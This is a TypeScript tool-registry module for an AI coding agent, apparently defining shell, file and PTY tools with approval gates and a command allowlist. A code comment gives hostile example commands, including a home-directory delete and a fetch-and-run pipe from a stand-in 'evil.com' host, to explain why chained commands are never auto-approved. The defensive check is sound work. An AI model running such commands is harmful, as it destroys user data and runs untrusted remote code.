import { ToolDenialError } from "./denial-errors.js";
import { SandboxInitializationError } from "./sandbox/errors.js";
import {
  ToolDefinition,
  ToolExecutionResult,
  ExecCommandInput,
  ReadFileInput,
  WriteFileInput,
  EditFileInput,
  GrepInput,
  GlobInput,
  ListDirectoryInput,
  PermissionGates,
  PtySpawnInput,
  PtyWriteInput,
  PtyReadInput,
  PtyKillInput,
} from "./types.js";
import { runCommandOperation } from "./command-runner.js";
import {
  readFileOperation,
  writeFileOperation,
  editFileOperation,
  grepOperation,
  globOperation,
  listDirectoryOperation,
} from "./file-ops.js";
import { PtySessionManager } from "./pty-manager.js";

export interface ToolExecutionContext {
  permissionGates?: PermissionGates;
  approvalGranted?: boolean;
  approvalId?: string;
  workspaceRoot?: string;
  allowOutsideWorkspace?: boolean;
  /**
   * Turn cancellation. Mirrors Grok Bot's ExecServerAbort: a long command is
   * killed when the user cancels the turn instead of running to its timeout.
   */
  signal?: AbortSignal;
  /**
   * Subagent delegation context. Set by the turn loop so delegate_to_agent
   * can stream the child turn's events up to the UI and bound nesting depth.
   */
  subagent?: {
    /** Sink invoked with the child coordinator's raw TurnEvent. */
    onEvent?: (event: any, info?: any) => void;
    /** Current delegation depth (0 = direct child of the main agent). */
    depth?: number;
    /** Parent coordinator session id, for nested delegation linkage. */
    sessionId?: string;
  };
}

export type CustomToolHandler = (args: Record<string, any>, context?: ToolExecutionContext) => Promise<any>;

export interface CustomToolRegistration {
  definition: ToolDefinition;
  handler: CustomToolHandler;
  requiresGate?: "computerUse" | "deviceTools";
}

export const CORE_TOOL_DEFINITIONS: Record<string, ToolDefinition> = {
  exec_command: {
    type: "function",
    function: {
      name: "exec_command",
      description: "Execute a bash shell command in the local workspace environment with preflight validation and timeout controls.",
      parameters: {
        type: "object",
        properties: {
          command: {
            type: "string",
            description: "The bash command string to execute.",
          },
          cwd: {
            type: "string",
            description: "Optional current working directory for the command execution.",
          },
          timeout_ms: {
            type: "number",
            description: "Timeout in milliseconds before the process is killed (default: 60000ms).",
          },
        },
        required: ["command"],
      },
    },
  },
  read_file: {
    type: "function",
    function: {
      name: "read_file",
      description: "Read contents of a file on the local filesystem, with optional line range slicing.",
      parameters: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The absolute or relative path to the file to read.",
          },
          start_line: {
            type: "number",
            description: "Optional starting line number (1-based, inclusive).",
          },
          end_line: {
            type: "number",
            description: "Optional ending line number (1-based, inclusive).",
          },
        },
        required: ["path"],
      },
    },
  },
  write_file: {
    type: "function",
    function: {
      name: "write_file",
      description: "Atomically write or overwrite content to a file on the local filesystem.",
      parameters: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The absolute or relative path to the file to write.",
          },
          content: {
            type: "string",
            description: "The full UTF-8 text content to write.",
          },
          overwrite: {
            type: "boolean",
            description: "Whether to allow overwriting if the file already exists (default: true).",
          },
        },
        required: ["path", "content"],
      },
    },
  },
  list_directory: {
    type: "function",
    function: {
      name: "list_directory",
      description: "List files and directories at a given path, with optional recursive traversal.",
      parameters: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The absolute or relative path of the directory to inspect.",
          },
          recursive: {
            type: "boolean",
            description: "Whether to recursively list subdirectories (default: false).",
          },
          max_depth: {
            type: "number",
            description: "Maximum depth for recursive listing (default: 3).",
          },
        },
        required: ["path"],
      },
    },
  },
  edit_file: {
    type: "function",
    function: {
      name: "edit_file",
      description: "Perform exact string replacement in a file. Errors if old_string is absent, not unique (unless replace_all is true), or identical to new_string.",
      parameters: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The absolute or relative path to the file to edit.",
          },
          old_string: {
            type: "string",
            description: "The exact existing text content to find and replace.",
          },
          new_string: {
            type: "string",
            description: "The new text content to substitute in place of old_string.",
          },
          replace_all: {
            type: "boolean",
            description: "Whether to replace all occurrences if old_string matches more than once (default: false).",
          },
        },
        required: ["path", "old_string", "new_string"],
      },
    },
  },
  grep: {
    type: "function",
    function: {
      name: "grep",
      description: "Search file contents under the workspace using regular expressions, returning file:line:text matches.",
      parameters: {
        type: "object",
        properties: {
          pattern: {
            type: "string",
            description: "The regular expression pattern to search for.",
          },
          path: {
            type: "string",
            description: "Optional file or directory path to search within (default: workspace root).",
          },
          glob: {
            type: "string",
            description: "Optional glob pattern to filter searched files (e.g. '*.ts' or '**/*.json').",
          },
          case_insensitive: {
            type: "boolean",
            description: "Whether regex matching should be case-insensitive (default: false).",
          },
          max_results: {
            type: "number",
            description: "Maximum number of matching lines to return before capping (default: 200).",
          },
        },
        required: ["pattern"],
      },
    },
  },
  glob: {
    type: "function",
    function: {
      name: "glob",
      description: "Find files and directories matching a glob pattern (**, *, ?) under the workspace.",
      parameters: {
        type: "object",
        properties: {
          pattern: {
            type: "string",
            description: "The glob pattern to match paths against.",
          },
          path: {
            type: "string",
            description: "Optional root path to search from (default: workspace root).",
          },
          max_results: {
            type: "number",
            description: "Maximum number of matched paths to return before capping (default: 200).",
          },
        },
        required: ["pattern"],
      },
    },
  },
};

export const PTY_TOOL_DEFINITIONS: Record<string, ToolDefinition> = {
  pty_spawn: {
    type: "function",
    function: {
      name: "pty_spawn",
      description: "Spawn an interactive pseudo-terminal (PTY) or long-running process session.",
      parameters: {
        type: "object",
        properties: {
          command: {
            type: "string",
            description: "The command string to execute in the PTY session.",
          },
          args: {
            type: "array",
            items: { type: "string" },
            description: "Optional command-line arguments.",
          },
          cwd: {
            type: "string",
            description: "Optional working directory.",
          },
          env: {
            type: "object",
            description: "Optional environment variables.",
          },
          cols: {
            type: "number",
            description: "Terminal column width (default: 80).",
          },
          rows: {
            type: "number",
            description: "Terminal row height (default: 24).",
          },
          sandboxProfile: {
            type: "string",
            enum: ["read-only", "workspace-write", "full"],
            description: "Optional sandbox containment profile for the PTY session.",
          },
          workspaceRoot: {
            type: "string",
            description: "Optional workspace root used for sandbox containment.",
          },
          homeDir: {
            type: "string",
            description: "Optional home directory used for sandbox containment.",
          },
          tempDir: {
            type: "string",
            description: "Optional temp directory used for sandbox containment.",
          },
          allowNetwork: {
            type: "boolean",
            description: "Optional network access for the sandboxed PTY session.",
          },
          customProfileString: {
            type: "string",
            description: "Optional macOS-only custom sandbox profile string.",
          },
        },
        required: ["command"],
      },
    },
  },
  pty_write: {
    type: "function",
    function: {
      name: "pty_write",
      description: "Write input data (keystrokes/commands) to an active PTY session's stdin.",
      parameters: {
        type: "object",
        properties: {
          session_id: {
            type: "string",
            description: "The ID of the target PTY session.",
          },
          data: {
            type: "string",
            description: "Data to write to stdin.",
          },
        },
        required: ["session_id", "data"],
      },
    },
  },
  pty_read: {
    type: "function",
    function: {
      name: "pty_read",
      description: "Read buffered terminal output from a PTY session with optional character offset.",
      parameters: {
        type: "object",
        properties: {
          session_id: {
            type: "string",
            description: "The ID of the target PTY session.",
          },
          offset: {
            type: "number",
            description: "Optional character offset to read from.",
          },
        },
        required: ["session_id"],
      },
    },
  },
  pty_kill: {
    type: "function",
    function: {
      name: "pty_kill",
      description: "Terminate an active PTY session by sending a POSIX signal.",
      parameters: {
        type: "object",
        properties: {
          session_id: {
            type: "string",
            description: "The ID of the target PTY session.",
          },
          signal: {
            type: "string",
            description: "Optional POSIX signal to send (default: SIGTERM).",
          },
        },
        required: ["session_id"],
      },
    },
  },
};

export interface ToolRegistryOptions {
  ptyManager?: PtySessionManager;
  enablePty?: boolean;
}

export class ToolRegistry {
  private customTools = new Map<string, CustomToolRegistration>();
  private ptyManager: PtySessionManager;
  private ptyToolsRegistered: boolean = false;

  constructor(options?: ToolRegistryOptions) {
    this.ptyManager = options?.ptyManager ?? new PtySessionManager();
    if (options?.enablePty) {
      this.registerPtyTools(this.ptyManager);
    }
  }

  /**
   * Enable and register PTY tools with an optional custom PtySessionManager.
   */
  registerPtyTools(manager?: PtySessionManager): void {
    if (manager) {
      this.ptyManager = manager;
    }
    this.ptyToolsRegistered = true;
  }

  /**
   * Access the underlying PtySessionManager.
   */
  getPtyManager(): PtySessionManager {
    return this.ptyManager;
  }

  /**
   * Return OpenAI-compatible function calling schemas for all registered tools.
   */
  getDefinitions(): ToolDefinition[] {
    const list = Object.values(CORE_TOOL_DEFINITIONS);
    if (this.ptyToolsRegistered) {
      list.push(...Object.values(PTY_TOOL_DEFINITIONS));
    }
    for (const custom of this.customTools.values()) {
      list.push(custom.definition);
    }
    return list;
  }

  /**
   * Register a custom tool or extension.
   */
  registerCustomTool(registration: CustomToolRegistration): void {
    const name = registration.definition.function.name;
    if (CORE_TOOL_DEFINITIONS[name] || PTY_TOOL_DEFINITIONS[name]) {
      throw new Error(`Cannot override core tool: ${name}`);
    }
    this.customTools.set(name, registration);
  }

  unregisterCustomTool(name: string): boolean {
    return this.customTools.delete(name);
  }

  /**
   * Check if a command is permitted under the standing allowlist.
   */
  private isCommandAllowlisted(command: string, allowlist: string[]): boolean {
    const trimmed = command.trim();

    // Safety check: Never auto-approve commands containing shell chaining or substitution
    // (e.g. "git status; rm -rf ~" or "ls && curl evil.com | bash")
    const hasChaining = /[;&|`]|\$\(|\n/.test(trimmed);
    if (hasChaining) {
      return false;
    }

    return allowlist.some((pattern) => {
      if (pattern.endsWith("*")) {
        const prefix = pattern.slice(0, -1).trim();
        return trimmed === prefix || trimmed.startsWith(`${prefix} `);
      }
      return trimmed === pattern || trimmed.startsWith(`${pattern} `);
    });
  }

  /**
   * Dispatch a tool call by name with inputs and context.
   */
  async dispatch(
    name: string,
    args: Record<string, any>,
    context?: ToolExecutionContext
  ): Promise<ToolExecutionResult> {
    try {
      // 1. Core Tool: exec_command
      if (name === "exec_command") {
        const input = args as ExecCommandInput;
        if (!input.command || typeof input.command !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'command' string argument.",
            },
          };
        }

        // Permission check
        const gates = context?.permissionGates;
        const isApproved = context?.approvalGranted ?? false;
        const allowlisted = gates?.standingAllowlist
          ? this.isCommandAllowlisted(input.command, gates.standingAllowlist)
          : false;

        if (gates && !gates.computerUseAllowed && !isApproved && !allowlisted) {
          return {
            status: "permission_pending",
            approvalId: context?.approvalId ?? `req-${Date.now()}`,
            error: {
              code: "PERMISSION_REQUIRED",
              reason: "approval_required",
              message: `Execution of bash command requires approval: "${input.command}"`,
            },
          };
        }

        const output = await runCommandOperation(
          {
            ...input,
            workspaceRoot: input.workspaceRoot ?? context?.workspaceRoot,
          },
          { signal: context?.signal }
        );
        return {
          status: "ok",
          output,
        };
      }

      // 2. Core Tool: read_file
      if (name === "read_file") {
        const input = args as ReadFileInput;
        if (!input.path || typeof input.path !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'path' string argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await readFileOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // 3. Core Tool: write_file
      if (name === "write_file") {
        const input = args as WriteFileInput;
        if (!input.path || typeof input.path !== "string" || typeof input.content !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'path' or 'content' argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await writeFileOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // Core Tool: edit_file
      if (name === "edit_file") {
        const input = args as EditFileInput;
        if (
          !input.path ||
          typeof input.path !== "string" ||
          typeof input.old_string !== "string" ||
          typeof input.new_string !== "string"
        ) {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'path', 'old_string', or 'new_string' argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await editFileOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // Core Tool: grep
      if (name === "grep") {
        const input = args as GrepInput;
        if (!input.pattern || typeof input.pattern !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'pattern' string argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await grepOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // Core Tool: glob
      if (name === "glob") {
        const input = args as GlobInput;
        if (!input.pattern || typeof input.pattern !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'pattern' string argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await globOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // 4. Core Tool: list_directory
      if (name === "list_directory") {
        const input = args as ListDirectoryInput;
        if (!input.path || typeof input.path !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'path' string argument.",
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const allowOutsideWorkspace = input.allowOutsideWorkspace ?? context?.allowOutsideWorkspace;
        const output = await listDirectoryOperation({ ...input, workspaceRoot, allowOutsideWorkspace });
        return {
          status: "ok",
          output,
        };
      }

      // 5. PTY Tool: pty_spawn
      if (name === "pty_spawn") {
        const input = args as PtySpawnInput;
        if (!input.command || typeof input.command !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'command' string argument.",
            },
          };
        }

        const gates = context?.permissionGates;
        const isApproved = context?.approvalGranted ?? false;
        const allowlisted = gates?.standingAllowlist
          ? this.isCommandAllowlisted(input.command, gates.standingAllowlist)
          : false;

        if (gates && !gates.computerUseAllowed && !isApproved && !allowlisted) {
          return {
            status: "permission_pending",
            approvalId: context?.approvalId ?? `req-${Date.now()}`,
            error: {
              code: "PERMISSION_REQUIRED",
              reason: "approval_required",
              message: `Execution of PTY command requires approval: "${input.command}"`,
            },
          };
        }

        const workspaceRoot = input.workspaceRoot ?? context?.workspaceRoot;
        const session = await this.ptyManager.createSession({
          ...input,
          workspaceRoot,
        });
        return {
          status: "ok",
          output: {
            session_id: session.id,
            ...session.getSnapshot(),
          },
        };
      }

      // 6. PTY Tool: pty_write
      if (name === "pty_write") {
        const input = args as PtyWriteInput;
        if (!input.session_id || typeof input.session_id !== "string" || typeof input.data !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'session_id' or 'data' argument.",
            },
          };
        }

        await this.ptyManager.writeToSession(input.session_id, input.data);
        return {
          status: "ok",
          output: {
            session_id: input.session_id,
            bytesWritten: Buffer.byteLength(input.data, "utf-8"),
          },
        };
      }

      // 7. PTY Tool: pty_read
      if (name === "pty_read") {
        const input = args as PtyReadInput;
        if (!input.session_id || typeof input.session_id !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'session_id' string argument.",
            },
          };
        }

        const output = this.ptyManager.readSession(input.session_id, input.offset);
        return {
          status: "ok",
          output,
        };
      }

      // 8. PTY Tool: pty_kill
      if (name === "pty_kill") {
        const input = args as PtyKillInput;
        if (!input.session_id || typeof input.session_id !== "string") {
          return {
            status: "error",
            error: {
              code: "INVALID_ARGUMENT",
              message: "Missing or invalid 'session_id' string argument.",
            },
          };
        }

        const killed = await this.ptyManager.killSession(input.session_id, input.signal);
        return {
          status: "ok",
          output: {
            session_id: input.session_id,
            killed,
          },
        };
      }

      // 9. Custom Registered Tool
      const custom = this.customTools.get(name);
      if (custom) {
        if (custom.requiresGate === "computerUse" && context?.permissionGates && !context.permissionGates.computerUseAllowed) {
          return {
            status: "permission_pending",
            approvalId: context?.approvalId ?? `req-${Date.now()}`,
            error: {
              code: "PERMISSION_REQUIRED",
              reason: "approval_required",
              message: `Tool '${name}' requires computerUse gate approval.`,
            },
          };
        }
        if (custom.requiresGate === "deviceTools" && context?.permissionGates && !context.permissionGates.deviceToolsAllowed) {
          return {
            status: "permission_pending",
            approvalId: context?.approvalId ?? `req-${Date.now()}`,
            error: {
              code: "PERMISSION_REQUIRED",
              reason: "approval_required",
              message: `Tool '${name}' requires deviceTools gate approval.`,
            },
          };
        }

        const customOutput = await custom.handler(args, context);
        return {
          status: "ok",
          output: customOutput,
        };
      }

      // Unknown tool
      return {
        status: "error",
        error: {
          code: "UNKNOWN_TOOL",
          message: `Unknown tool requested: ${name}`,
        },
      };
    } catch (err: any) {
      if (err instanceof ToolDenialError) {
        return {
          status: "error",
          error: { code: err.code, message: err.message, reason: err.reason },
        };
      }
      if (err instanceof SandboxInitializationError) {
        return {
          status: "error",
          error: {
            code: err.code ?? "SANDBOX_INIT_FAILED",
            message: err.message,
          },
        };
      }
      return {
        status: "error",
        error: {
          code: "EXECUTION_ERROR",
          message: err?.message || String(err),
        },
      };
    }
  }
}
